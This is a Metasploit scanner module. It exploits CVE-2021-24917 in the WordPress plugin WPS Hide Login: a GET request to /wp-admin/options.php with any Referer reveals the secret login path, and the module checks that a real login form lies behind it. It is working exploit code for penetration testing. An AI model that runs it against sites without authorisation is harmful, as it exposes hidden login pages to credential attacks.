##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress WPS Hide Login Login Page Revealer',
        'Description' => %q{
          This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login
          is used to make a new secret path to the login page, however a 'GET' request to
          '/wp-admin/options.php' with a referer will reveal the hidden path.
        },
        'References' => [
          ['WPVDB', '15bb711a-7d70-4891-b7a2-c473e3e8b375'],
          ['CVE', '2021-24917'],
          ['URL', 'https://wordpress.org/support/topic/bypass-security-issue/']
        ],
        'Author' => [
          'thalakus', # Vulnerability discovery
          'h00die' # Metasploit module
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2021-10-27',
        'License' => MSF_LICENSE
      )
    )
  end

  def run_host(_ip)
    fail_with Failure::NotVulnerable, 'Server not online or not detected as WordPress' unless wordpress_and_online?

    checkcode = check_plugin_version_from_readme('wps-hide-login', '1.9.1')
    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
      fail_with Failure::NotVulnerable, "A vulnerable version of 'WPS Hide Login' was not found"
    end
    print_status('Checking the potentially vulnerable WPS Hide Login redirect')

    options = { 'method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options.php') }
    res = send_request_cgi(options.merge('headers' => { 'Referer' => Rex::Text.rand_text_alphanumeric(rand(5..7)) }))
    fail_with Failure::Unreachable, 'Options request did not receive a response' unless res
    fail_with Failure::NotVulnerable, "Options request did not return HTTP 302 (received #{res.code})" unless res.code == 302

    location = res.headers['Location']
    unless location.is_a?(String) && !location.empty? && res.redirection
      fail_with Failure::UnexpectedReply, 'Options redirect did not contain a valid Location'
    end
    origin = http_redirect_origin_from_options(options)
    unless same_origin_redirect?(res.redirection, origin)
      fail_with Failure::UnexpectedReply, 'Refusing a redirect outside the configured HTTP origin; check SSL, RPORT and VHOST'
    end

    reconfig_redirect_opts!(res, options, preserve_connection: true, connection_options: http_redirect_connection_options(options))
    # A redirect can lead to an ordinary concealment/error page. Require the
    # real authentication form, allowing one same-origin canonical redirect.
    page = send_request_cgi!(options, redirect_policy: :same_origin)
    fail_with Failure::Unreachable, 'Login-page verification did not receive a response' unless page
    fail_with Failure::NoAccess, "Login-page verification was denied (HTTP #{page.code})" if [401, 403].include?(page.code)
    fail_with Failure::NotVulnerable, 'The redirect destination did not expose a WordPress login page (HTTP 404)' if page.code == 404
    fail_with Failure::UnexpectedReply, "Login-page verification did not return HTTP 200 (received #{page.code})" unless page.code == 200
    fail_with Failure::NotVulnerable, 'The redirect destination did not contain a WordPress login form' unless wordpress_login_page?(page, origin)

    login_uri = http_redirect_request_uri(options, origin)
    login_uri.query = options['query'].presence
    print_good("Login page: #{login_uri}")
  rescue OpenSSL::SSL::SSLError => e
    elog('TLS negotiation failed while probing WPS Hide Login', error: e)
    fail_with Failure::Unreachable, 'TLS negotiation failed while probing WPS Hide Login'
  end

  private

  def same_origin_redirect?(location, origin)
    http_redirect_allowed?(http_redirect_target_origin(location, origin), origin, :same_origin, [])
  end

  def wordpress_login_page?(response, origin)
    document = response.get_html_document
    return false unless document

    document.css('form').any? do |form|
      next false unless form['method'].to_s.casecmp?('post')

      password = form.at_css('input[name="pwd"]')
      next false unless form.at_css('input[name="log"]') && password && password['type'].to_s.casecmp?('password') && form.at_css('[name="wp-submit"]')

      same_origin_redirect?(URI.parse(form['action'].to_s), origin)
    rescue URI::Error => e
      elog('Invalid WordPress login-form action', error: e)
      false
    end
  end
end
